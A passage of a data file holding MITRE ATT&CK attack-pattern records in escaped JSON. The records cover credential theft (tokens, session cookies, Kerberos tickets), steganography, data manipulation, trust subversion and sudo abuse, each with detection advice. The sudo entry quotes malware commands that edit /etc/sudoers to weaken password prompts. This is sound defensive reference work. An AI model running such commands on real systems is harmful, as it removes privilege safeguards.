2017\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks\"}],\"id\":\"attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-23T15:59:40.522Z\",\"name\":\"Steal Application Access Token\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Shailesh Tiwary (Indian Army)\",\"Mark Wee\",\"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)\",\"Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Azure activity logs\",\"OAuth audit logs\"],\"x_mitre_detection\":\"Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a “High severity app permissions” policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.\\n\\nSecurity analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old “Last authorized” fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.\\n\\nAdministrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.\",\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"SaaS\",\"Office 365\",\"Azure AD\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-10-08T20:04:35.508Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\\n\\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\\n\\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\\n\\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1506) technique to login to the corresponding web application.\",\"external_references\":[{\"external_id\":\"T1539\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1539\"},{\"description\":\"Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.\",\"source_name\":\"Pass The Cookie\",\"url\":\"https://wunderwuzzi23.github.io/blog/passthecookie.html\"},{\"description\":\"GReAT. (2019, April 10). Project TajMahal – a sophisticated new APT framework. Retrieved October 14, 2019.\",\"source_name\":\"Kaspersky TajMahal April 2019\",\"url\":\"https://securelist.com/project-tajmahal/90240/\"},{\"description\":\"Chen, Y., Hu, W., Xu, Z., et. al.. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.\",\"source_name\":\"Unit 42 Mac Crypto Cookies January 2019\",\"url\":\"https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/\"},{\"description\":\"Gretzky, Kuba. (2019, April 10). Retrieved October 8, 2019.\",\"source_name\":\"Github evilginx2\",\"url\":\"https://github.com/kgretzky/evilginx2\"},{\"description\":\"Orrù, M., Trotta, G.. (2019, September 11). Muraena. Retrieved October 14, 2019.\",\"source_name\":\"GitHub Mauraena\",\"url\":\"https://github.com/muraenateam/muraena\"}],\"id\":\"attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-04-21T15:26:25.584Z\",\"name\":\"Steal Web Session Cookie\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Microsoft Threat Intelligence Center (MSTIC)\",\"Johann Rehberger\"],\"x_mitre_data_sources\":[\"File monitoring\",\"API monitoring\"],\"x_mitre_detection\":\"Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"Office 365\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T19:12:46.830Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). \\n\\nKerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\",\"external_references\":[{\"external_id\":\"T1558\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1558\"},{\"description\":\"Sean Metcalf. (2014, September 12). Kerberos, Active Directory’s Secret Decoder Ring. Retrieved February 27, 2020.\",\"source_name\":\"ADSecurity Kerberos Ring Decoder\",\"url\":\"https://adsecurity.org/?p=227\"},{\"description\":\"Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.\",\"source_name\":\"ADSecurity Detecting Forged Tickets\",\"url\":\"https://adsecurity.org/?p=1515\"},{\"description\":\"Jeff Warren. (2019, February 19). How to Detect Pass-the-Ticket Attacks. Retrieved February 27, 2020.\",\"source_name\":\"Stealthbits Detect PtT 2019\",\"url\":\"https://blog.stealthbits.com/detect-pass-the-ticket-attacks\"},{\"description\":\"Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.\",\"source_name\":\"CERT-EU Golden Ticket Protection\",\"url\":\"https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf\"},{\"description\":\"Microsoft. (2015, March 24). Kerberos Golden Ticket Check (Updated). Retrieved February 27, 2020.\",\"source_name\":\"Microsoft Kerberos Golden Ticket\",\"url\":\"https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285\"},{\"description\":\"Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.\",\"source_name\":\"Microsoft Detecting Kerberoasting Feb 2018\",\"url\":\"https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/\"},{\"description\":\"Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.\",\"source_name\":\"AdSecurity Cracking Kerberos Dec 2015\",\"url\":\"https://adsecurity.org/?p=2293\"},{\"description\":\"French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting Attempts to Steal Passwords from Memory\",\"url\":\"https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea\"}],\"id\":\"attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-31T12:59:11.121Z\",\"name\":\"Steal or Forge Kerberos Tickets\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows event logs\",\"Authentication logs\"],\"x_mitre_detection\":\"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.(Citation: ADSecurity Detecting Forged Tickets)(Citation: Stealthbits Detect PtT 2019)(Citation: CERT-EU Golden Ticket Protection)\\n\\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\\n\\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. \\n\\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking Kerberos Dec 2015)\\n\\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Kerberos authentication enabled\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-05T14:28:16.719Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\\n\\n[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim\'s system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) \\n\\nBy the end of 2017, a threat group used\u{202f}<code>Invoke-PSImage</code>\u{202f}to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim\'s system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim\'s machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  \",\"external_references\":[{\"external_id\":\"T1027.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1027/003\"},{\"description\":\"Wikipedia. (2017, December 29). Duqu. Retrieved April 10, 2018.\",\"source_name\":\"Wikipedia Duqu\",\"url\":\"https://en.wikipedia.org/wiki/Duqu\"},{\"description\":\"Saavedra-Morales, J., Sherstobitoff, R. (2018, January 6). Malicious Document Targets Pyeongchang Olympics. Retrieved April 10, 2018.\",\"source_name\":\"McAfee Malicious Doc Targets Pyeongchang Olympics\",\"url\":\"https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/\"}],\"id\":\"attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-08T18:16:48.253Z\",\"name\":\"Steganography\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Binary file metadata\"],\"x_mitre_detection\":\"Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings are other signatures left in system artifacts related to decoding steganography.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-15T00:37:58.963Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. \",\"external_references\":[{\"external_id\":\"T1001.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1001/002\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-15T00:37:58.963Z\",\"name\":\"Steganography\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-04-09T11:51:30.942Z\",\"external_references\":[{\"external_id\":\"T1492\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1492\"},{\"description\":\"FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.\",\"source_name\":\"FireEye APT38 Oct 2018\",\"url\":\"https://content.fireeye.com/apt/rpt-apt38\"},{\"description\":\"Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.\",\"source_name\":\"DOJ Lazarus Sony 2018\",\"url\":\"https://www.justice.gov/opa/press-release/file/1092091/download\"}],\"id\":\"attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92\",\"modified\":\"2020-03-02T14:24:26.780Z\",\"name\":\"Stored Data Manipulation\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-02T14:22:24.410Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\\n\\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\",\"external_references\":[{\"external_id\":\"T1565.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1565/001\"},{\"description\":\"FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.\",\"source_name\":\"FireEye APT38 Oct 2018\",\"url\":\"https://content.fireeye.com/apt/rpt-apt38\"},{\"description\":\"Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.\",\"source_name\":\"DOJ Lazarus Sony 2018\",\"url\":\"https://www.justice.gov/opa/press-release/file/1092091/download\"}],\"id\":\"attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-02T15:17:40.505Z\",\"name\":\"Stored Data Manipulation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Application logs\"],\"x_mitre_detection\":\"Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values.\",\"x_mitre_impact_type\":[\"Integrity\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"root\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-05T14:54:07.588Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\\n\\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) \",\"external_references\":[{\"external_id\":\"T1553\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1553\"},{\"description\":\"Graeber, M. (2017, September). Subverting Trust in Windows. Retrieved January 31, 2018.\",\"source_name\":\"SpectorOps Subverting Trust Sept 2017\",\"url\":\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\"},{\"description\":\"Ladikov, A. (2015, January 29). Why You Shouldn’t Completely Trust Files Signed with Digital Certificates. Retrieved March 31, 2016.\",\"source_name\":\"Securelist Digital Certificates\",\"url\":\"https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/\"},{\"description\":\"Shinotsuka, H. (2013, February 22). How Attackers Steal Private Keys from Digital Certificates. Retrieved March 31, 2016.\",\"source_name\":\"Symantec Digital Certificates\",\"url\":\"http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates\"},{\"description\":\"Graeber, M. (2017, December 22). Code Signing Certificate Cloning Attacks and Defenses. Retrieved April 3, 2018.\",\"source_name\":\"SpectorOps Code Signing Dec 2017\",\"url\":\"https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\"}],\"id\":\"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:42:26.314Z\",\"name\":\"Subvert Trust Controls\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"revoked\":false,\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Binary file metadata\",\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\",\"API monitoring\",\"Application logs\",\"DLL monitoring\",\"Loaded DLLs\",\"Windows Registry\",\"Windows event logs\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Anti-virus\",\"Autoruns Analysis\",\"Digital Certificate Validation\",\"Process whitelisting\",\"User Mode Signature Validation\",\"Windows User Account Control\"],\"x_mitre_detection\":\"Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers. Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017) A system\'s root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017)\\n\\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \\\"Hide Microsoft Entries\\\" and \\\"Hide Windows Entries\\\" are both deselected.(Citation: SpectorOps Subverting Trust Sept 2017) \\n\\nMonitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. \",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1169\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1169\"},{\"description\":\"Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.\",\"source_name\":\"OSX.Dok Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/\"}],\"id\":\"attack-pattern--9e80ddfb-ce32-4961-a778-ca6a10cfae72\",\"modified\":\"2020-02-05T20:11:12.593Z\",\"name\":\"Sudo\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1206\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1206\"},{\"description\":\"Todd C. Miller. (2018). Sudo Man Page. Retrieved March 19, 2018.\",\"source_name\":\"sudo man page 2018\",\"url\":\"https://www.sudo.ws/\"},{\"description\":\"Amit Serper. (2018, May 10). ProtonB What this Mac Malware Actually Does. Retrieved March 19, 2018.\",\"source_name\":\"cybereason osx proton\",\"url\":\"https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does\"}],\"id\":\"attack-pattern--2169ba87-1146-4fc7-a118-12b72251db7e\",\"modified\":\"2020-02-05T20:10:18.586Z\",\"name\":\"Sudo Caching\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-30T14:34:44.992Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may perform sudo caching and/or use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\\n\\nWithin Linux and MacOS systems, sudo (sometimes referred to as \\\"superuser do\\\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \\\"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\\\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\\n\\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code> (Citation: OSX.Dok Malware). Elevated privileges are required to edit this file though.\\n\\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user\'s password. For example, <code>/var/db/sudo</code>\'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user\'s password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\\n\\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\\\\'Defaults !tty_tickets\\\\\' >> /etc/sudoers</code> (Citation: cybereason osx proton). In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.\",\"external_references\":[{\"external_id\":\"T1548.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1548/003\"},{\"description\":\"Todd C. Miller. (2018). Sudo Man Page. Retrieved March 19, 2018.\",\"source_name\":\"sudo man page 2018\",\"url\":\"https://www.sudo.ws/\"},{\"description\":\"Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.\",\"source_name\":\"OSX.Dok Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/\"},{\"description\":\"Amit Serper. (2018, May 10). ProtonB What this Mac Malware Actually Does. Retrieved March 19, 2018.\",\"source_name\":\"cybereason osx proton\",\"url\":\"https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does\"}],\"id\":\"attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-27T01:03:26.306Z\",\"name\":\"Sudo and Sudo Caching\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"On Linux, auditd can alert every time a user\'s actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.\",\"x_mitre_effective_permissions\":[\"root\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\\n\\nSupply chain compromise can take place at any stage of the supply chain including:\\n\\n* Manipulation of development tools\\n* Manipulation of a development environment\\n* Manipulation of source code repositories (public or private)\\n* Manipulation of source code in open-source dependencies\\n* Manipulation of software update/distribution mechanisms\\n* Compromised/infected system images (multiple cases of removable media infected at the factory) (Citation: IBM Storwize) (Citation: Schneider Electric USB Malware) \\n* Replacement of legitimate software with modified versions\\n* Sales of modified/counterfeit products to legitimate distributors\\n* Shipment interdiction\\n\\nWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)\",\"external_references\":[{\"external_id\":\"T1195\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1195\"},{\"external_id\":\"CAPEC-437\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/437.html\"},{\"external_id\":\"CAPEC-438\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/438.html\"},{\"external_id\":\"CAPEC-439\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/439.html\"},{\"description\":\"IBM Support. (2017, April 26). Storwize USB Initialization Tool may contain malicious code. Retrieved May 28, 2019.\",\"source_name\":\"IBM Storwize\",\"url\":\"https://www-01.ibm.com/support/docview.wss?uid=ssg1S1010146&myns=s028&mynp=OCSTHGUJ&mynp=OCSTLM5A&mynp=OCSTLM6B&mynp=OCHW206&mync=E&cm_sp=s028-_-OCSTHGUJ-OCSTLM5A-OCSTLM6B-OCHW206-_-E\"},{\"description\":\"Schneider Electric. (2018, August 24). Security Notification – USB Removable Media Provided With Conext Combox and Conext Battery Monitor. Retrieved May 28, 2019.\",\"source_name\":\"Schneider Electric USB Malware\",\"url\":\"https://www.schneider-electric.com/en/download/document/SESN-2018-236-01/\"},{\"description\":\"Avast Threat Intelligence Team. (2018, March 8). New investigations into the CCleaner incident point to a possible third stage that had keylogger capacities. Retrieved March 15, 2018.\",\"source_name\":\"Avast CCleaner3 2018\",\"url\":\"https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities\"},{\"description\":\"Windows Defender Research. (2018, March 7). Behavior monitoring combined with machine learning spoils a massive Dofoil coin mining campaign. Retrieved March 20, 